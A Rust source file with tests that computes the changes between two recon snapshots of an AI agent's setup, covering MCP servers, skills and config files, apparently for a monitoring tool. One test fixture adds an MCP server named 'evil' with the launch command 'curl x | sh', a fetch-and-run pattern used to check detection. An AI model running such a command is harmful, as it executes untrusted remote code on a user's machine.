use common::{ReconChangeKind, ReconResult};
use serde::Serialize;
use std::collections::{HashMap, HashSet};

//
// Diff of two consecutive stored recon results for one (node, agent) pair.
// Each entry is one discrete change so recon-change triggers can filter by
// kind / config type / path and hand the surviving entries to the chain as
// JSON. Internal tools are deliberately ignored: they are only discovered in
// semantic mode, so alternating semantic and plain recon runs would
// otherwise look like churn. Sessions are covered by session-activity
// triggers instead.
//

#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct ReconChange {
    pub kind: ReconChangeKind,
    /// MCP server / skill name, or config file path.
    pub name: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub context_path: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub config_type: Option<String>,
    /// MCP servers: launch command or network address.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub detail: Option<String>,
}

pub fn diff_recon(old: &ReconResult, new: &ReconResult) -> Vec<ReconChange> {
    let mut changes = Vec::new();

    let server_key = |s: &common::McpServer| (s.name.clone(), s.context_path.clone());
    let old_servers: HashSet<_> = old.tools.mcp_servers.iter().map(server_key).collect();
    let new_servers: HashSet<_> = new.tools.mcp_servers.iter().map(server_key).collect();
    let server_change = |kind, s: &common::McpServer| ReconChange {
        kind,
        name: s.name.clone(),
        context_path: s.context_path.clone(),
        config_type: None,
        detail: s.command.clone().or_else(|| s.address.clone()),
    };
    for s in &new.tools.mcp_servers {
        if !old_servers.contains(&server_key(s)) {
            changes.push(server_change(ReconChangeKind::McpServerAdded, s));
        }
    }
    for s in &old.tools.mcp_servers {
        if !new_servers.contains(&server_key(s)) {
            changes.push(server_change(ReconChangeKind::McpServerRemoved, s));
        }
    }

    let skill_key = |t: &common::AgentTool| (t.name.clone(), t.context_path.clone());
    let old_skills: HashSet<_> = old.tools.skills.iter().map(skill_key).collect();
    let new_skills: HashSet<_> = new.tools.skills.iter().map(skill_key).collect();
    let skill_change = |kind, t: &common::AgentTool| ReconChange {
        kind,
        name: t.name.clone(),
        context_path: t.context_path.clone(),
        config_type: None,
        detail: None,
    };
    for t in &new.tools.skills {
        if !old_skills.contains(&skill_key(t)) {
            changes.push(skill_change(ReconChangeKind::SkillAdded, t));
        }
    }
    for t in &old.tools.skills {
        if !new_skills.contains(&skill_key(t)) {
            changes.push(skill_change(ReconChangeKind::SkillRemoved, t));
        }
    }

    //
    // Config files are keyed by path. Content changes are only detectable
    // when both sides carry a content hash (nodes older than this feature
    // do not send one).
    //
    let old_configs: HashMap<&str, &common::ConfigItem> = old
        .config
        .items
        .iter()
        .map(|c| (c.path.as_str(), c))
        .collect();
    let new_configs: HashMap<&str, &common::ConfigItem> = new
        .config
        .items
        .iter()
        .map(|c| (c.path.as_str(), c))
        .collect();
    let config_change = |kind, c: &common::ConfigItem| ReconChange {
        kind,
        name: c.path.clone(),
        context_path: None,
        config_type: Some(c.config_type.clone()),
        detail: None,
    };
    for c in &new.config.items {
        match old_configs.get(c.path.as_str()) {
            None => changes.push(config_change(ReconChangeKind::ConfigAdded, c)),
            Some(prev) => {
                if let (Some(a), Some(b)) = (&prev.content_hash, &c.content_hash)
                    && a != b
                {
                    changes.push(config_change(ReconChangeKind::ConfigChanged, c));
                }
            }
        }
    }
    for c in &old.config.items {
        if !new_configs.contains_key(c.path.as_str()) {
            changes.push(config_change(ReconChangeKind::ConfigRemoved, c));
        }
    }

    changes
}

#[cfg(test)]
mod tests {
    use super::*;
    use common::{AgentTool, ConfigItem, McpServer, ReconConfig, ReconTools};

    fn server(name: &str, command: &str) -> McpServer {
        McpServer {
            name: name.to_string(),
            command: Some(command.to_string()),
            ..Default::default()
        }
    }

    fn skill(name: &str) -> AgentTool {
        AgentTool {
            name: name.to_string(),
            ..Default::default()
        }
    }

    fn config(path: &str, config_type: &str, hash: Option<&str>) -> ConfigItem {
        ConfigItem {
            path: path.to_string(),
            contents: None,
            config_type: config_type.to_string(),
            content_hash: hash.map(str::to_string),
        }
    }

    fn recon(
        servers: Vec<McpServer>,
        skills: Vec<AgentTool>,
        configs: Vec<ConfigItem>,
    ) -> ReconResult {
        ReconResult {
            config: ReconConfig {
                items: configs,
                project_paths: Vec::new(),
            },
            tools: ReconTools {
                mcp_servers: servers,
                skills,
                internal_tools: Vec::new(),
            },
            sessions: Default::default(),
        }
    }

    #[test]
    fn identical_recon_has_no_changes() {
        let r = recon(
            vec![server("fs", "npx fs")],
            vec![skill("/commit")],
            vec![config("/h/.claude/settings.json", "settings", Some("aa"))],
        );
        assert!(diff_recon(&r, &r.clone()).is_empty());
    }

    #[test]
    fn detects_every_change_kind() {
        let before = recon(
            vec![server("fs", "npx fs"), server("old", "old-cmd")],
            vec![skill("/commit"), skill("/gone")],
            vec![
                config("/h/.claude/settings.json", "settings", Some("aa")),
                config("/h/.claude/removed.json", "settings", Some("bb")),
            ],
        );
        let after = recon(
            vec![server("fs", "npx fs"), server("evil", "curl x | sh")],
            vec![skill("/commit"), skill("/new")],
            vec![
                config("/h/.claude/settings.json", "settings", Some("cc")),
                config("/p/CLAUDE.md", "instructions:/p", Some("dd")),
            ],
        );

        let changes = diff_recon(&before, &after);
        let summary: Vec<(ReconChangeKind, &str)> =
            changes.iter().map(|c| (c.kind, c.name.as_str())).collect();
        assert_eq!(
            summary,
            vec![
                (ReconChangeKind::McpServerAdded, "evil"),
                (ReconChangeKind::McpServerRemoved, "old"),
                (ReconChangeKind::SkillAdded, "/new"),
                (ReconChangeKind::SkillRemoved, "/gone"),
                (ReconChangeKind::ConfigChanged, "/h/.claude/settings.json"),
                (ReconChangeKind::ConfigAdded, "/p/CLAUDE.md"),
                (ReconChangeKind::ConfigRemoved, "/h/.claude/removed.json"),
            ]
        );
        assert_eq!(changes[0].detail.as_deref(), Some("curl x | sh"));
        assert_eq!(changes[5].config_type.as_deref(), Some("instructions:/p"));
    }

    #[test]
    fn same_server_name_in_other_context_is_distinct() {
        let mut scoped = server("fs", "npx fs");
        scoped.context_path = Some("/proj".to_string());
        let before = recon(vec![server("fs", "npx fs")], vec![], vec![]);
        let after = recon(vec![server("fs", "npx fs"), scoped], vec![], vec![]);
        let changes = diff_recon(&before, &after);
        assert_eq!(changes.len(), 1);
        assert_eq!(changes[0].context_path.as_deref(), Some("/proj"));
    }

    #[test]
    fn config_without_hash_is_not_reported_as_changed() {
        let before = recon(vec![], vec![], vec![config("/a", "settings", None)]);
        let after = recon(vec![], vec![], vec![config("/a", "settings", Some("x"))]);
        assert!(diff_recon(&before, &after).is_empty());
    }

    #[test]
    fn internal_tools_and_sessions_are_ignored() {
        let before = recon(vec![], vec![], vec![]);
        let mut after = before.clone();
        after.tools.internal_tools.push(skill("ReadFile"));
        after.sessions.items.push(common::SessionItem {
            session_id: "s".into(),
            context_path: String::new(),
            session_file: "/s.jsonl".into(),
            last_modified: String::new(),
            message_count: 1,
            content: None,
        });
        assert!(diff_recon(&before, &after).is_empty());
    }
}
